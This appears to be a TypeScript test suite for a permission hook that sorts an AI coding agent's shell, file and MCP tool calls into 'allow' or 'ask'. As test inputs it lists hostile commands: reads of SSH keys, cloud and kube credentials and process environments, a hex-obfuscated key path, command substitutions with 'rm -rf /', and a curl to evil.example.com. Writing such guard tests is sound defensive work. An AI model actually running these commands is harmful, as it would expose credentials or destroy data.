import { describe, expect, test } from 'claude-code/testing'

import { check, parse } from '../hooks/policy'

const cfg = { sshHosts: ['*.example.net', 'web-*'], curlHosts: ['api.example.net'] }
const bash = (command: string) => check('Bash', { command }, cfg).decision

describe('tools', () => {
  test('reading tools run, the others ask', async () => {
    expect(check('Read', { file_path: '/repo/main.tf' }, cfg).decision).toBe('allow')
    expect(check('Grep', { pattern: 'x', path: '/repo' }, cfg).decision).toBe('allow')
    for (const tool of ['Edit', 'Write', 'NotebookEdit', 'WebFetch', 'SomethingNew']) expect(check(tool, {}, cfg).decision).toBe('ask')
  })

  test('secrets are read with you', async () => {
    for (const file_path of ['/repo/.env', '/repo/.env.local', '/home/me/.ssh/id_rsa', '/repo/tls.key', '/home/me/.aws/credentials'])
      expect(check('Read', { file_path }, cfg).decision).toBe('ask')
    expect(bash('cat .env')).toBe('ask')
    expect(bash('curl -s --cert c.pem --key c.key https://api.example.net/x')).toBe('allow')
    expect(bash('cat c.key')).toBe('ask')
  })

  test('MCP tools by their verbs', async () => {
    for (const tool of ['mcp__shortcut__stories-get-by-id', 'mcp__datadog__search-logs', 'mcp__slite__ask-slite',
      'mcp__github__get_pull_request', 'mcp__context7__resolve-library-id', 'mcp__claude_ai_Slack__slack_read_thread'])
      expect(check(tool, {}, cfg).decision).toBe('allow')
    for (const tool of ['mcp__shortcut__stories-create-comment', 'mcp__shortcut__stories-update', 'mcp__mysql_core_local__execute_sql',
      'mcp__claude_ai_Slack__slack_send_message_draft', 'mcp__github__merge_pull_request', 'mcp__n8n__execute_workflow',
      'mcp__playwright__browser_click', 'mcp__claude_ai_Shortcut__authenticate', 'mcp__sentry__analyze_issue_with_seer',
      'mcp__github__get_or_create_thing', 'mcp__unknown__frobnicate'])
      expect(check(tool, {}, cfg).decision).toBe('ask')
  })
})

describe('shell reader', () => {
  test('segments, quotes and redirections', async () => {
    expect(parse(`grep -r "a b $X" . | sort | uniq -c 2>/dev/null && echo 'done; $Y'`)).toEqual([
      { words: ['grep', '-r', 'a b $X', '.'], redirects: [], expands: ['X'] },
      { words: ['sort'], redirects: [], expands: [] },
      { words: ['uniq', '-c'], redirects: [{ op: '2>', target: '/dev/null' }], expands: [] },
      { words: ['echo', 'done; $Y'], redirects: [], expands: [] },
    ])
  })

  test('what it leaves to you', async () => {
    for (const src of ['echo $(rm -rf /)', 'echo `id`', 'diff <(ls a) <(ls b)', '(cd /; rm x)', 'cat <<EOF\nrm x\nEOF', `echo 'open`])
      expect(parse(src)).toBe(null)
  })
})

describe('commands', () => {
  test('reading runs', async () => {
    for (const c of ['ls -la', 'cat /var/log/syslog | grep -i error | tail -50', 'git log --oneline -5', 'git -C /repo diff HEAD~1',
      'git branch -a', 'git fetch origin', 'gh pr view 12 --json title', 'gh api repos/o/r/pulls', 'gh run list -R o/r',
      'find . -name "*.tf"', "sed -n '1,20p' file", "awk '{print $1}' file", 'df -h; free -m', 'systemctl status nginx',
      'journalctl -u nginx --since "1 hour ago"', 'docker ps', 'docker compose logs app', 'curl -sS http://localhost:8300/api/summary',
      'curl -s --cert c.pem https://api.example.net/x', 'top -b -n1', 'ping -c 3 host', 'date +%F', 'kafka-topics.sh --describe --topic t',
      'nomad job status app', 'consul members', 'dig example.net', 'cd /repo && git status', 'sort -k2 file', 'timeout 10 cat x'])
      expect([c, bash(c)]).toEqual([c, 'allow'])
  })

  test('anything that writes, runs code or is unknown asks', async () => {
    for (const c of ['rm -rf /tmp/x', 'echo x > file', 'echo x >> file', 'cat a | tee b', 'ls | xargs rm', 'bash -c "ls"',
      'python3 -c "print(1)"', 'git push', 'git commit -m x', 'git branch new-branch', 'git -c core.pager=sh log',
      'git diff --output=x', 'gh pr merge 1', 'gh pr comment 1 -b x', 'gh api -X POST repos/o/r/issues', 'gh api repos/o/r -f a=b',
      'gh api graphql -f query=x', 'curl -X POST http://localhost:8300/api/items/1/ack', 'curl -d a=b http://localhost:8300',
      'curl -o out http://localhost:8300', 'curl https://evil.example.com/?k=v', 'sed -i s/a/b/ file', "sed -n 's/a/b/w out' f",
      'find . -delete', 'find . -exec rm {} ;', 'systemctl restart nginx', 'docker rm x', 'docker exec x sh', 'sort -o out in',
      'uniq in out', "awk '{system(\"rm x\")}' f", 'kafka-topics.sh --delete --topic t', 'nomad job stop app', 'terraform apply',
      'FOO=1 ls', 'hostname evil', 'date -s 2020-01-01', 'top', 'ping host', 'ip route add 1.2.3.0/24 dev eth0', 'mount /dev/x /mnt',
      'sudo -i', 'kill 1', 'chmod 777 x', 'mise exec -- pulse tf apply'])
      expect([c, bash(c)]).toEqual([c, 'ask'])
  })

  test('sudo and timeout wrap a command, they do not widen it', async () => {
    expect(bash('sudo journalctl -u app -n 50')).toBe('allow')
    expect(bash('sudo -u postgres cat /var/log/x')).toBe('allow')
    expect(bash('sudo systemctl restart app')).toBe('ask')
    expect(bash('timeout 5 rm x')).toBe('ask')
  })
})

describe('what the review found', () => {
  test('awk runs nothing, whichever fragment says so', async () => {
    expect(bash(`awk -e 'BEGIN{}' -e 'system("id")' /dev/null`)).toBe('ask')
    expect(bash(`awk '{print $1 > "/tmp/x"}' f`)).toBe('ask')
    expect(bash(`awk 'BEGIN{print ENVIRON["GITHUB_TOKEN"]}'`)).toBe('ask')
    expect(bash('awk -l filefuncs 1 f')).toBe('ask')
  })

  test('sed only prints', async () => {
    for (const c of ["sed -n '1,20p' f", "sed 's/a/b/g' f", "sed 's|a|b|;s/c/d/' f", "sed -E 's/(a)/\\1/' f", "sed -e 's/a/b/' -e '/x/d' f", "sed -n '/start/,/end/p' f", "sed '$!N' f"])
      expect([c, bash(c)]).toEqual([c, 'allow'])
    for (const c of ["sed 'w/tmp/x' f", "sed 'r /etc/passwd' /dev/null", "sed 's/a/b/w out' f", "sed '1e date' f", 'sed y/ab/cd/ f', "sed -f script f", "sed -i '' 's/a/b/' f"])
      expect([c, bash(c)]).toEqual([c, 'ask'])
  })

  test('the credential stores of a workstation', async () => {
    for (const c of ['cat ~/.config/scw/config.yaml', 'cat ~/.kube/config', 'cat ~/.docker/config.json', 'cat ~/.pgpass',
      'cat ~/.con*/scw/*', 'cat ~/.{config,x}/scw/config.yaml', 'cat /proc/1/environ', 'cat ~/.zsh_history', 'ssh web-1 "cat ~/.config/scw/config.yaml"'])
      expect([c, bash(c)]).toEqual([c, 'ask'])
    expect(check('Read', { file_path: '/Users/me/Dev/.mcp.json' }, cfg).decision).toBe('ask')
    expect(check('Read', { file_path: '/Users/me/.claude.json' }, cfg).decision).toBe('ask')
    expect(check('Read', { file_path: '/Users/me/.ssh/config' }, cfg).decision).toBe('allow')
    expect(bash("grep -iE '^Host ' ~/.ssh/config")).toBe('allow')
    expect(bash('cat ~/.ssh/known_hosts')).toBe('allow')
    expect(bash('cat ~/.ssh/id_ed25519')).toBe('ask')
    expect(bash('cat ~/.ssh/config.d/secret')).toBe('ask')
    expect(check('Read', { file_path: '/Users/me/.claude/projects/-Users-me-Dev/memory/MEMORY.md' }, cfg).decision).toBe('allow')
    expect(bash('grep -n kafka /Users/me/.claude/projects/-Users-me-Dev/memory/MEMORY.md')).toBe('allow')
    expect(check('Read', { file_path: '/Users/me/.claude/projects/-Users-me-Dev/3f2477e8.jsonl' }, cfg).decision).toBe('ask')
    expect(check('Read', { file_path: '/Users/me/.claude/settings.json' }, cfg).decision).toBe('ask')
    expect(bash("grep -rliE 'consumer|7200 seconds' ~/.claude/projects/*/memory ~/.claude/CLAUDE.md")).toBe('allow')
    expect(bash('ls ~/.claude/projects/*/memory')).toBe('allow')
    expect(bash('grep -r AKIA ~/.claude/projects/*/memory ~/Dev')).toBe('ask')
    expect(bash('cat ~/.claude/projects/*/*.jsonl')).toBe('ask')
  })

  test('variables that may hold a token are not expanded', async () => {
    for (const c of ['echo $GITHUB_TOKEN', 'echo "$DD_API_KEY"', 'echo ${AWS_SECRET_ACCESS_KEY}', "ssh web-1 'echo $DB_PASSWORD'"])
      expect([c, bash(c)]).toEqual([c, 'ask'])
    for (const c of ["echo '$SOMETHING'", 'ls $HOME', 'cd "$HOME/repo" && git status'])
      expect([c, bash(c)]).toEqual([c, 'allow'])
  })

  test('the second review', async () => {
    for (const c of ["cat $'\\x7e\\x2f\\x2e\\x73\\x73\\x68\\x2f\\x69\\x64\\x5f\\x72\\x73\\x61'", 'jq -rn env', "jq -n 'env.DD_API_KEY'",
      'jq -n \'$ENV.X\'', 'jq --rawfile k ~/x .', 'base64 -i /etc/hostname -o /Users/me/.zshenv', 'sort --compress-program=sh f',
      'grep -r AKIA .', 'grep -rn token src', 'rg --hidden KEY', 'rg -uu KEY', 'rg AKIA ~', 'rg AKIA /Users/me'])
      expect([c, bash(c)]).toEqual([c, 'ask'])
    for (const c of ["jq '.items[] | .name' f.json", 'base64 -d f', 'grep -n error app.log', 'rg -n "def main" src'])
      expect([c, bash(c)]).toEqual([c, 'allow'])
    expect(check('mcp__somedb__query', {}, cfg).decision).toBe('ask')
  })

  test('ps without the environment', async () => {
    expect(bash('ps aux')).toBe('allow')
    expect(bash('ps eww')).toBe('ask')
    expect(bash('ps -E')).toBe('ask')
  })
})

describe('ssh', () => {
  test('a reading command on a host it may read', async () => {
    expect(bash("ssh web-1.example.net 'df -h; uptime'")).toBe('allow')
    expect(bash('ssh deploy@web-3 sudo journalctl -u app -n 100')).toBe('allow')
    expect(bash('ssh -o ConnectTimeout=5 web-2 "cat /etc/hostname | tr a-z A-Z"')).toBe('allow')
    const bastion = { sshHosts: ['bastion-*', '10.20.*'], curlHosts: [] }
    expect(check('Bash', { command: 'ssh -o StrictHostKeyChecking=accept-new -J bastion-1 root@10.20.0.84 uptime' }, bastion).decision).toBe('allow')
    expect(check('Bash', { command: 'ssh -J evil.example.com root@10.20.0.84 uptime' }, bastion).decision).toBe('ask')
    expect(check('Bash', { command: 'ssh -o StrictHostKeyChecking=no root@10.20.0.84 uptime' }, bastion).decision).toBe('ask')
  })

  test('a write, a tunnel, a proxy, a shell or another host asks', async () => {
    for (const c of ["ssh web-1 'sudo systemctl restart app'", "ssh web-1 'rm -rf /data/x'", 'ssh web-1', 'ssh other.host ls',
      'ssh -L 8080:localhost:80 web-1 ls', 'ssh -o ProxyCommand=evil web-1 ls', "ssh web-1 'echo x > /etc/y'",
      "ssh web-1 'ls $(rm x)'", 'ssh -J jump web-1 ls', 'ssh -F ./cfg web-1 ls'])
      expect([c, bash(c)]).toEqual([c, 'ask'])
  })

  test('no host configured, no ssh on its own', async () => {
    expect(check('Bash', { command: 'ssh web-1 uptime' }, { sshHosts: [], curlHosts: [] }).decision).toBe('ask')
  })
})
